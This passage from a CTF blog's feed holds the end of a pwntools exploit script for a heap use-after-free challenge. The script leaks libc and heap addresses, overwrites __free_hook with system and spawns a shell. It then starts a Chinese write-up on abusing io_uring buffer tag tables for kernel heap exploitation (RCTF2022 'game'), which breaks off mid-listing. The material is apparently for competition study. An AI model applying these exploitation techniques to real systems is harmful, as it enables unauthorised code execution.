class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_all_loan</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;login&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    login(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">          <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">new_account(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>),</span><br><span class="line">            <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0xffffffff</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>), <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="string">b&#x27;dzhsb\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>), flat([<span class="number">0</span>]))</span><br><span class="line">delete_account(flat(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;n&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;&gt;&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x5d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">password = heap_base + <span class="number">0x620</span></span><br><span class="line">account = heap_base + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">login(flat(account).ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), flat(password))</span><br><span class="line">update_info(flat(free_hook, [<span class="number">0</span>]*<span class="number">4</span>), flat(password))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>, flat(system_addr), <span class="number">0x0</span>)</span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0x187C)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;diary&quot;&gt;&lt;a href=&quot;#diary&quot; class=&quot;headerlink&quot; title=&quot;diary&quot;&gt;&lt;/a&gt;diary&lt;/h2&gt;&lt;h3 id=&quot;利用分析&quot;&gt;&lt;a href=&quot;#利用分析&quot; class=&quot;headerlink&quot; title=&quot;利用分析&quot;</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>io_uring在kernel pwn中的优异表现</title>
    <link href="https://cv196082.gitee.io/2023/04/20/io-uring/"/>
    <id>https://cv196082.gitee.io/2023/04/20/io-uring/</id>
    <published>2023-04-20T10:13:02.000Z</published>
    <updated>2023-04-20T10:13:20.832Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前各种比赛的各种赛制真的是让人十分难受，以至于感觉自己不怎么适合打比赛了。所以打算静下心来复现一场比赛，在RCTF中找到分值最低的一道题。做的过程中越看越不对劲，还算是有难度的一道内核堆题怎么被打烂了，一搜才发现是有非预期解。但我头铁，静下心来用预期解打，索性功夫不负有心人在这道题目中发现了不得了的东西。</p><h3 id="目前的窘境"><a href="#目前的窘境" class="headerlink" title="目前的窘境"></a>目前的窘境</h3><p>如果存在UAF的object规定大小只能为0x10的话，各位肯定会想到使用可以实现分配任意大小object的函数。</p><p>所以如果提到内核中可以达到任意大小的结构体时估计各位会想到<code>setxattr</code>、<code>msg_msg</code>之类的。但是这两者均具有很大的局限性，<code>setxattr</code>前面提到过，这个在调用完成后会<code>kfree</code>掉使用的object，并且在高版本的linux内核中这个函数早已被修改了。<code>msg_msg</code>这个结构体就更为明显了，需要用很大的空间来保存结构体中的成员。</p><p>因为是size很小的堆块所以各位可能还会思考到一部分结构体例如:<code>seq_operations</code>、<code>shm_file_data</code>之类的。但是他们的size也是0x20。</p><h2 id="IO-uring"><a href="#IO-uring" class="headerlink" title="IO_uring"></a>IO_uring</h2><p>网上关于io_uring对于kernel pwn的利用相对较少，特别是中文文章，我几乎没搜到，搜到的也只是对其进行介绍，并没有实际的操作之类的。所以为了写这篇文章我看了两天Linux内核的源码，眼睛都要瞎了！！！</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>关于IO_uring的介绍在网上其实很多。<code>io_uring</code>是2019年Linux 5.1内核首次引入的高性能异步I/O框架，可以显着加速I/O密集型应用程序的性能。为了减少 I/O 操作时的内存映射，该模块允许用户预先注册一些固定的 I/O 缓冲区，以便这些缓冲区可以被重用。这里推荐大家最好去看看关于他的实现。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里算是这篇文章的重点！</p><h4 id="分配object"><a href="#分配object" class="headerlink" title="分配object"></a>分配object</h4><p>当我们调用<code>io_uring_register_buffers_tags</code>函数时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_tags</span><span class="params">(struct io_uring *ring,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_register</span> <span class="title">reg</span> =</span> &#123;</span><br><span class="line">.nr = nr,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS2, &amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_ROUND_UP(n,d) (((n) + (d) - 1) / (d))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __cold <span class="keyword">void</span> **<span class="title">io_alloc_page_table</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"><span class="keyword">size_t</span> init_size = size;</span><br><span class="line"><span class="keyword">void</span> **table;</span><br><span class="line"></span><br><span class="line">table = kcalloc(nr_tables, <span class="keyword">sizeof</span>(*table), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> this_size = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">table[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table[i]) &#123;</span><br><span class="line">io_free_page_table(table, init_size);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">size -= this_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会进入上面这个函数中，其中的size是我们可以直接进行控制的，可以明显的看出来这里可以真正实现任意大小分配，并且在<code>table[i]</code>也就是<code>ctx-&gt;buf_data-&gt;tags[i]</code>中不含有任何指针或者数据之类的，在<code>table</code>也就是<code>ctx-&gt;buf_data-&gt;tags</code>中只含有后面分配的object指针。</p><h4 id="更新object"><a href="#更新object" class="headerlink" title="更新object"></a>更新object</h4><p>当我们调用<code>io_uring_register_buffers_update_tag</code>函数时，可以对tags也就是我们上面<code>table[i]</code>中分配的object进行内容更新：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">unsigned</span> off,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_update2</span> <span class="title">up</span> =</span> &#123;</span><br><span class="line">.offset= off,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">.nr = nr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS_UPDATE, &amp;up, <span class="keyword">sizeof</span>(up));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IO_RSRC_TAG_TABLE_SHIFT(PAGE_SHIFT - 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u64 *<span class="title">io_get_tag_slot</span><span class="params">(struct io_rsrc_data *data, <span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> off = idx &amp; IO_RSRC_TAG_TABLE_MASK;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> table_idx = idx &gt;&gt; IO_RSRC_TAG_TABLE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;data-&gt;tags[table_idx][off];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __io_sqe_buffers_update(struct io_ring_ctx *ctx,</span><br><span class="line">   struct io_uring_rsrc_update2 *up,</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span><br><span class="line">&#123;</span><br><span class="line">u64 __user *tags = u64_to_user_ptr(up-&gt;tags);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>, __<span class="title">user</span> *<span class="title">iovs</span> =</span> u64_to_user_ptr(up-&gt;data);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">last_hpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> needs_switch = <span class="literal">false</span>;</span><br><span class="line">__u32 done;</span><br><span class="line"><span class="keyword">int</span> i, err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;buf_data)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (done = <span class="number">0</span>; done &lt; nr_args; done++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span> *<span class="title">imu</span>;</span></span><br><span class="line"><span class="keyword">int</span> offset = up-&gt;offset + done;</span><br><span class="line">u64 tag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = io_copy_iov(ctx, &amp;iov, iovs, done);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], <span class="keyword">sizeof</span>(tag))) &#123;</span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_buffer_validate(&amp;iov);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!iov.iov_base &amp;&amp; tag) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">i = array_index_nospec(offset, ctx-&gt;nr_user_bufs);</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;</span><br><span class="line">err = io_queue_rsrc_removal(ctx-&gt;buf_data, i,</span><br><span class="line">    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);</span><br><span class="line"><span class="keyword">if</span> (unlikely(err)) &#123;</span><br><span class="line">io_buffer_unmap(ctx, &amp;imu);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;</span><br><span class="line">needs_switch = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;user_bufs[i] = imu;</span><br><span class="line">*io_get_tag_slot(ctx-&gt;buf_data, offset) = tag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_switch)</span><br><span class="line">io_rsrc_node_switch(ctx, ctx-&gt;buf_data);</span><br><span class="line"><span class="keyword">return</span> done ? done : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到他这里更新方式也很独树一帜，并不是简单的<code>copy_from_user</code>之类的，而是八个字节八个字节的写。</p><h4 id="释放object"><a href="#释放object" class="headerlink" title="释放object"></a>释放object</h4><p>调用<code>io_uring_unregister_buffers</code>函数即可对所有object进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_unregister_buffers</span><span class="params">(struct io_uring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_UNREGISTER_BUFFERS, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">io_free_page_table</span><span class="params">(<span class="keyword">void</span> **table, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++)</span><br><span class="line">kfree(table[i]);</span><br><span class="line">kfree(table);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终调用到的是上面这个函数中，其中table的含义跟分配时一致。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过上面三个方向的分析，各位大佬应该能想到IO_uring在很多方面都可以进行利用，不过他的缺点也很明显，他无法读取堆块上的内容(可能是我没找到，找到的佬可以留言一下)。</p><h2 id="RCTF2022-game"><a href="#RCTF2022-game" class="headerlink" title="RCTF2022 game"></a>RCTF2022 game</h2><p>现在开始题目分析，出题人师傅是给了源代码的，但是通过ida逆向并不困难，所以下面还是给ida中的代码</p><h3 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 